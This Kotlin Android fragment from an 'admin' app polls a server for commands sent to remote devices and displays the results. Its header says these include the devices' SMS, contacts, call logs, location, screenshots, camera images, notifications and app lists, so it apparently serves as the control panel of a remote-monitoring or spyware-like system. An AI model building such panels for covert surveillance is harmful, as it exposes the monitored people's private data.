package com.abuzahra.admin.ui.fragments

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.activityViewModels
import androidx.recyclerview.widget.LinearLayoutManager
import com.abuzahra.admin.MainActivity
import com.abuzahra.admin.R
import com.abuzahra.admin.data.api.Result
import com.abuzahra.admin.data.model.Device
import com.abuzahra.admin.databinding.FragmentResultsBinding
import com.abuzahra.admin.ui.adapters.CommandResultAdapter
import com.abuzahra.admin.ui.dashboard.DashboardViewModel
import com.abuzahra.admin.ui.dashboard.DashboardViewModelFactory
import com.abuzahra.admin.util.Preferences
import com.google.android.material.dialog.MaterialAlertDialogBuilder

/**
 * Results fragment — functional copy of the web's CommandResults:
 *  - Device selector (if no device selected → prompt)
 *  - Polls /api/web/commands?device_id=X every 4 seconds (matches web's 4000ms)
 *  - Shows command list with status (pending/completed/failed/sent)
 *  - Tap completed command → expand + show result with parsers:
 *      SMS → list (sender, body, date)
 *      Contacts → list (name, phone)
 *      Calls → list (number, type, duration)
 *      Location → map view (WebView with OpenStreetMap)
 *      Screenshot/camera → image view
 *      Notifications → list
 *      Apps → list
 *      Default → raw JSON or text
 *  - Manual refresh button
 *  - Pull-to-refresh
 */
class ResultsFragment : BaseFragment() {

    private var _binding: FragmentResultsBinding? = null
    private val binding get() = _binding!!

    private val viewModel: DashboardViewModel by activityViewModels {
        DashboardViewModelFactory(Preferences.getInstance(requireContext()))
    }

    private val resultsAdapter: CommandResultAdapter by lazy { CommandResultAdapter() }

    /** Polling job — fetches commands every 4s (matches web). */
    private val pollHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private val pollRunnable = object : Runnable {
        override fun run() {
            viewModel.selectedDevice.value?.let { device ->
                viewModel.loadCommands(device.id)
            }
            pollHandler.postDelayed(this, 4000)
        }
    }

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentResultsBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        binding.rvResults.apply {
            layoutManager = LinearLayoutManager(requireContext())
            adapter = resultsAdapter
        }

        binding.btnRefresh.setOnClickListener {
            viewModel.selectedDevice.value?.let { viewModel.loadCommands(it.id) }
        }
        binding.resultsSwipe.setOnRefreshListener {
            viewModel.selectedDevice.value?.let { viewModel.loadCommands(it.id) }
        }

        binding.btnChangeDevice.setOnClickListener { showDevicePicker() }
        binding.cardDeviceSelected.setOnClickListener { showDevicePicker() }

        observeViewModel()
        updateSelectedDeviceCard(viewModel.selectedDevice.value)
    }

    private fun observeViewModel() {
        viewModel.selectedDevice.observe(viewLifecycleOwner) { device ->
            updateSelectedDeviceCard(device)
            if (device != null) {
                viewModel.loadCommands(device.id)
            } else {
                resultsAdapter.submitList(emptyList())
                updateCounts(0, 0)
            }
        }

        viewModel.commands.observe(viewLifecycleOwner) { result ->
            binding.resultsSwipe.isRefreshing = false
            when (result) {
                is Result.Loading -> Unit
                is Result.Success -> {
                    val list = result.data
                    resultsAdapter.submitList(list)
                    binding.emptyState.visibility = if (list.isEmpty()) View.VISIBLE else View.GONE
                    binding.rvResults.visibility = if (list.isEmpty()) View.GONE else View.VISIBLE
                    val pending = list.count {
                        it.status.lowercase() in setOf("pending", "sent", "queued")
                    }
                    updateCounts(list.size, pending)
                }
                is Result.Error -> {
                    (activity as? MainActivity)?.showSnack(result.message)
                    if (result.code == 401) {
                        // session expired — go to login
                        startActivity(
                            android.content.Intent(
                                requireContext(),
                                com.abuzahra.admin.ui.login.LoginActivity::class.java
                            )
                        )
                    }
                }
            }
        }
    }

    private fun updateCounts(total: Int, pending: Int) {
        binding.tvCountTotal.text = total.toString()
        binding.tvCountPending.text = pending.toString()
    }

    private fun updateSelectedDeviceCard(device: Device?) {
        if (device == null) {
            binding.tvSelectedDeviceName.text = "لم يتم اختيار جهاز"
            binding.tvSelectedDeviceMeta.text = "اضغط لاختيار جهاز"
        } else {
            binding.tvSelectedDeviceName.text = device.name.ifEmpty { device.model }
            binding.tvSelectedDeviceMeta.text = buildString {
                if (device.brand.isNotEmpty()) append(device.brand)
                if (device.model.isNotEmpty()) {
                    if (isNotEmpty()) append(" • ")
                    append(device.model)
                }
                append(" • ")
                append(if (device.isOnline) "متصل" else "غير متصل")
            }
        }
    }

    private fun showDevicePicker() {
        val devices = (viewModel.devices.value as? Result.Success)?.data ?: emptyList()
        if (devices.isEmpty()) {
            (activity as? MainActivity)?.showSnack(getString(R.string.select_device_first))
            (activity as? MainActivity)?.navigateToView(R.id.nav_devices)
            return
        }
        val labels = devices.map { d ->
            "${d.name.ifEmpty { d.model.ifEmpty { "جهاز" } }}  •  ${if (d.isOnline) "متصل" else "غير متصل"}"
        }.toTypedArray()
        MaterialAlertDialogBuilder(requireContext())
            .setTitle(R.string.devices)
            .setItems(labels) { _, which ->
                if (which in devices.indices) viewModel.selectDevice(devices[which])
            }
            .setNegativeButton(R.string.cancel, null)
            .show()
    }

    override fun onResume() {
        super.onResume()
        // Start polling
        pollHandler.post(pollRunnable)
        viewModel.selectedDevice.value?.let { viewModel.loadCommands(it.id) }
    }

    override fun onPause() {
        super.onPause()
        pollHandler.removeCallbacks(pollRunnable)
    }

    override fun onDestroyView() {
        super.onDestroyView()
        pollHandler.removeCallbacks(pollRunnable)
        _binding = null
    }
}
